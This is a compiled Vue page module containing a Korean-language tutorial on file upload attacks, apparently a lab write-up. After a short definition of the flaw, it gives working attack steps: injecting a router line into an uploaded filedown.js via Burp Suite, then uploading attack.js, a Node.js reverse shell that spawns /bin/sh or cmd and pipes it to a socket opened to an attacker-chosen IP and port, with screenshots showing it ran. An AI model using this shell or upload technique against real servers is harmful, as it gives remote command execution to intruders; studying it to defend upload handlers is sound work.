import{_ as n}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as s,c as a,f as t}from"./app.d51fb666.js";const p={},e=t(`<h1 id="파일-업로드-공격" tabindex="-1"><a class="header-anchor" href="#파일-업로드-공격" aria-hidden="true">#</a> 파일 업로드 공격</h1><h2 id="_1-파일-업로드-취약점이란" tabindex="-1"><a class="header-anchor" href="#_1-파일-업로드-취약점이란" aria-hidden="true">#</a> 1. 파일 업로드 취약점이란 ?</h2><ul><li>파일 업로드 취약점은 웹 서버가 제공하는 파일 업로드 기능을 이용하여 확장자 검증 미흡으로 서버에 악의적인 파일이 업로드가 가능한 취약점이다.</li><li>공격자는 서버에서 실행될 수 있는 파일을 업로드하여 공격자가 원하는 기능을 동작하게 한다. 적절한 검증 없이 파일 업로드 기능을 제공할 때 발생하는 취약점이므로 확장자에 대한 검증을 적용해야 한다.</li></ul><h2 id="_2-공격-방법" tabindex="-1"><a class="header-anchor" href="#_2-공격-방법" aria-hidden="true">#</a> 2. 공격 방법</h2><p>파일 다운로드 공격에서 다운받은 filedown.js 파일의 소스코드를 분석하여 아래와 같은 라우터 기능을 추가한다.</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">&#39;/attack&#39;</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;../../../upload/attack.js&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>수정된 filedown.js를 Burpsuite를 통해 업로드 경로를 수정하여 업로드한다.</p><p><img src="https://user-images.githubusercontent.com/115529661/200773381-29c9c606-064a-4ed5-b177-f6b2c1e58fda.jpg" alt="수정된filedown.js업로드" loading="lazy"></p><p>filedown.js가 업로드 되는 것이 확인 되었으니 attack.js를 만들어 업로드를 진행해본다.</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;express&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;net&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;child_process&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 서버 OS가 리눅스 일 때</span>
		sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">&quot;cmd&quot;</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 서버 OS가 윈도우 일 때</span>
	<span class="token keyword">var</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>port<span class="token punctuation">,</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>ip<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>
		sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
		sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">a</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="https://user-images.githubusercontent.com/115529661/200774037-1414f3da-e507-492f-ae38-5279ee5e923f.jpg" alt="attack.js업로드" loading="lazy"></p><p>attack.js가 정상적으로 업로드 된 것을 확인해 볼 수 있다.</p><p>업로드가 되었으니 웹쉘을 실행해본다.</p><p><img src="https://user-images.githubusercontent.com/115529661/200774615-56c47ede-f23b-4de1-b6af-1f040d15fd3b.jpg" alt="공격결과" loading="lazy"></p><p>웹쉘 실행결과 정상적으로 실행된다는 것을 확인할 수 있고, js파일 업로드와 업로드 된 파일이 실행되는 것으로 업로드 공격을 진행할 수 있다.</p>`,15),o=[e];function c(u,i){return s(),a("div",null,o)}const k=n(p,[["render",c],["__file","file_upload.html.vue"]]);export{k as default};
